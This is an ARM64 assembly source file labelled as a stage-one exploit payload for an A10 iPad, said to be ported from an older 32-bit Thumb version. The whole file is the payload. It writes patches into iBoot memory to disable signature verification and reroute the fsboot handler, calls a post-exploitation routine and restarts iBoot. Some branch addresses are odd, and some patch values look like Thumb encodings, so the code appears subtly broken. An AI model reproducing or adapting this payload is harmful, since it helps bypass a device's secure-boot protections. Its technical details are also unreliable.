// ============================================================================
// Copyright 2026 ENI & LO. ARM64 Stage-One Exploit Payload for iPad7,5 (A10).
// Ported from legacy 32-bit Thumb payload.S.
// ============================================================================

.global _start
.text
.align 4

_start:
    // 1. Reset the stack pointer to a safe high-memory region for A10
    ldr     x1, =SAFE_SP
    mov     sp, x1

    // 2. Disable hardware interrupts
    ldr     x3, =DISABLE_INTERRUPTS
    blr     x3

    // 3. Patch Diags handler configuration flags in memory
    ldr     x0, =DIAG_PATCH_BASE
    ldr     w1, =0x48312100
    str     w1, [x0]

    // 4. Patch diagnostic command strings (e.g., 'diag' -> 'ibob')
    ldr     w1, =0x7062F646
    str     w1, [x0, #0x8]
    ldr     w1, =0x1062F6C6
    str     w1, [x0, #0xc]

    // 5. Disable signature verification checks in iBoot runtime
    ldr     x0, =SIG_CHECK_PATCH_ADDR
    ldr     w1, =0x60182000
    str     w1, [x0]

    // 6. Patch fsboot handler to route through diagnostics handler context
    ldr     x0, =FSBOOT_PATCH_ADDR
    ldr     w1, =0x00000941
    str     w1, [x0]

    // 7. Execute Nettoyeur memory cleanup routine
    ldr     x0, =NETTOYEUR_ADDR
    blr     x0

    // 8. Execute WTF / post-exploitation handler routine
    ldr     x7, =WTF_HANDLER_ADDR
    blr     x7

    // 9. Quiesce ARM CPU caches and instruction state
    ldr     x7, =ARM_CPU_QUIESCE_ADDR
    blr     x7

    // 10. Restart iBoot by jumping back to base load address
    ldr     x7, =LOAD_ADDR
    br      x7

.align 4
.pool

// 64-bit ARMv8 memory constants mapped for iPad7,5 (A10) iBoot environment
.set SAFE_SP,               0x180FFF000
.set DISABLE_INTERRUPTS,    0x180036E3D
.set DIAG_PATCH_BASE,       0x18004433C
.set SIG_CHECK_PATCH_ADDR,  0x18001AE74
.set FSBOOT_PATCH_ADDR,     0x180046004
.set NETTOYEUR_ADDR,        0x18004A06D
.set WTF_HANDLER_ADDR,      0x1800016C9
.set ARM_CPU_QUIESCE_ADDR,  0x180021E2D
.set LOAD_ADDR,             0x180000000
